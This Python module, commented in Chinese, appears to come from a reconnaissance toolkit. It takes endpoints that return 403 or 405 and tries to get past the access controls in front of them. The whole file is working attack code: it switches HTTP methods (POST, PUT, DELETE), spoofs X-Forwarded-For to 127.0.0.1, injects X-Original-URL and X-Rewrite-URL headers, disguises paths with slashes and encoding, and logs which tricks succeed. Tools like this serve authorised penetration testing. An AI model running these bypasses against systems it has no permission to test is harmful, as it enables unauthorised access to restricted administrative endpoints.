"""WAF/403/405 绕过策略库.

当 dir_brute 发现 403/405 端点时, 自动尝试常见绕过手法:
  - HTTP 方法切换 (GET → POST/PUT/DELETE)
  - Header 注入 (X-Forwarded-For, X-Original-URL)
  - 路径变形 (//, /., /%2e, /)
  - 协议降级 (HTTP/1.1 → HTTP/1.0)

输出: out/waf_bypass.data.enc + key.enc
"""
from __future__ import annotations

import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any
from urllib.parse import urlparse

from _common import _read_encrypted, write_encrypted, http_get

# 绕过策略库
BYPASS_STRATEGIES = [
    {
        "name": "method_post",
        "description": "切换为 POST 方法",
        "method": "POST",
        "headers": {},
        "path_transform": lambda p: p,
    },
    {
        "name": "method_put",
        "description": "切换为 PUT 方法",
        "method": "PUT",
        "headers": {},
        "path_transform": lambda p: p,
    },
    {
        "name": "method_delete",
        "description": "切换为 DELETE 方法",
        "method": "DELETE",
        "headers": {},
        "path_transform": lambda p: p,
    },
    {
        "name": "x_forwarded_for",
        "description": "X-Forwarded-For: 127.0.0.1 (绕过 IP 限制)",
        "method": "GET",
        "headers": {"X-Forwarded-For": "127.0.0.1"},
        "path_transform": lambda p: p,
    },
    {
        "name": "x_original_url",
        "description": "X-Original-URL 头绕过",
        "method": "GET",
        "headers": {},  # 动态设置
        "path_transform": lambda p: p,
    },
    {
        "name": "x_rewrite_url",
        "description": "X-Rewrite-URL 头绕过",
        "method": "GET",
        "headers": {},  # 动态设置
        "path_transform": lambda p: p,
    },
    {
        "name": "path_dot_slash",
        "description": "路径变形: /admin → /admin/./",
        "method": "GET",
        "headers": {},
        "path_transform": lambda p: f"{p}/.//" if not p.endswith("/") else p,
    },
    {
        "name": "path_double_slash",
        "description": "路径变形: /admin → //admin//",
        "method": "GET",
        "headers": {},
        "path_transform": lambda p: f"//{p.strip('/')}/" if p else "/",
    },
    {
        "name": "path_encoding",
        "description": "URL 编码绕过",
        "method": "GET",
        "headers": {},
        "path_transform": lambda p: p.replace("/", "%2f"),
    },
    {
        "name": "path_trailing_slash",
        "description": "尾部斜杠: /admin → /admin/",
        "method": "GET",
        "headers": {},
        "path_transform": lambda p: p.rstrip("/") + "/" if not p.endswith("/") else p,
    },
    {
        "name": "user_agent_curl",
        "description": "切换 User-Agent 为 curl",
        "method": "GET",
        "headers": {"User-Agent": "curl/7.68.0"},
        "path_transform": lambda p: p,
    },
    {
        "name": "referer_self",
        "description": "Referer 指向自身域名",
        "method": "GET",
        "headers": {},  # 动态设置
        "path_transform": lambda p: p,
    },
]


def try_bypass(url: str, original_status: int, strategy: dict) -> dict[str, Any] | None:
    """尝试一种绕过策略."""
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = strategy["path_transform"](parsed.path)

    headers = dict(strategy.get("headers", {}))

    # 动态设置 header
    if strategy["name"] == "x_original_url":
        headers["X-Original-URL"] = parsed.path
    elif strategy["name"] == "x_rewrite_url":
        headers["X-Rewrite-URL"] = parsed.path
    elif strategy["name"] == "referer_self":
        headers["Referer"] = base

    headers.setdefault("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")

    try:
        r = http_get(
            url if strategy["path_transform"](parsed.path) == parsed.path else f"{base}{path}",
            timeout=5,
            method=strategy["method"],
            headers=headers,
        )
        if not r:
            return None

        new_status = r.status_code
        # 成功绕过: 状态码改变且不再是 403/405
        if new_status != original_status and new_status not in (403, 405):
            return {
                "strategy": strategy["name"],
                "description": strategy["description"],
                "method": strategy["method"],
                "headers": {k: v for k, v in headers.items() if k != "User-Agent"},
                "original_status": original_status,
                "bypassed_status": new_status,
                "bypassed": True,
            }
        # 状态码改变但仍是错误
        elif new_status != original_status:
            return {
                "strategy": strategy["name"],
                "description": strategy["description"],
                "method": strategy["method"],
                "headers": {k: v for k, v in headers.items() if k != "User-Agent"},
                "original_status": original_status,
                "bypassed_status": new_status,
                "bypassed": False,
                "note": f"状态码从 {original_status} 变为 {new_status}",
            }
    except Exception:
        pass
    return None


def bypass_endpoint(url: str, original_status: int) -> list[dict]:
    """对单个端点尝试所有绕过策略."""
    results: list[dict] = []

    with ThreadPoolExecutor(max_workers=5) as ex:
        futs = {
            ex.submit(try_bypass, url, original_status, s): s
            for s in BYPASS_STRATEGIES
        }
        for fut in as_completed(futs):
            r = fut.result()
            if r:
                results.append(r)

    return results


def main() -> int:
    print("[waf-bypass] 读取 dirs", file=sys.stderr)
    dirs_data = _read_encrypted("dirs")
    target = dirs_data.get("target", "")
    print(f"[waf-bypass] 目标: {target}", file=sys.stderr)

    # 收集所有 403/405 端点
    blocked_endpoints: list[dict] = []
    for base, items in dirs_data.get("results", {}).items():
        for item in items:
            if item.get("status") in (403, 405):
                blocked_endpoints.append({
                    "url": item["url"],
                    "status": item["status"],
                    "path": item.get("path", ""),
                })

    if not blocked_endpoints:
        print("[waf-bypass] 未发现 403/405 端点", file=sys.stderr)
        write_encrypted("waf_bypass", {
            "target": target,
            "endpoints_tested": 0,
            "bypasses_found": [],
            "elapsed_s": 0,
        })
        return 0

    # 限制测试数量避免超时
    test_limit = int(os.environ.get("WAF_BYPASS_LIMIT", "20"))
    to_test = blocked_endpoints[:test_limit]

    print(f"[waf-bypass] 待测试 403/405 端点: {len(to_test)}", file=sys.stderr)

    t0 = time.time()
    all_bypasses: list[dict] = []

    for ep in to_test:
        results = bypass_endpoint(ep["url"], ep["status"])
        if results:
            for r in results:
                r["target_url"] = ep["url"]
                r["target_path"] = ep["path"]
            all_bypasses.extend(results)
            success = [r for r in results if r.get("bypassed")]
            if success:
                print(f"  [BYPASS] {ep['url']}: {success[0]['strategy']} "
                      f"→ {success[0]['bypassed_status']}", file=sys.stderr)

    elapsed = time.time() - t0

    # 统计
    success_count = sum(1 for b in all_bypasses if b.get("bypassed"))
    strategy_stats: dict[str, int] = {}
    for b in all_bypasses:
        s = b.get("strategy", "?")
        strategy_stats[s] = strategy_stats.get(s, 0) + 1

    print(f"\n[waf-bypass] 测试 {len(to_test)} 端点, "
          f"发现 {success_count} 个成功绕过, "
          f"{len(all_bypasses)} 个状态变化", file=sys.stderr)
    print(f"[waf-bypass] 策略统计: {strategy_stats}", file=sys.stderr)

    write_encrypted("waf_bypass", {
        "target": target,
        "endpoints_tested": len(to_test),
        "total_blocked": len(blocked_endpoints),
        "bypasses_successful": success_count,
        "bypasses_total": len(all_bypasses),
        "strategy_stats": strategy_stats,
        "bypasses": all_bypasses,
        "elapsed_s": round(elapsed, 1),
    })
    return 0


if __name__ == "__main__":
    sys.exit(main())
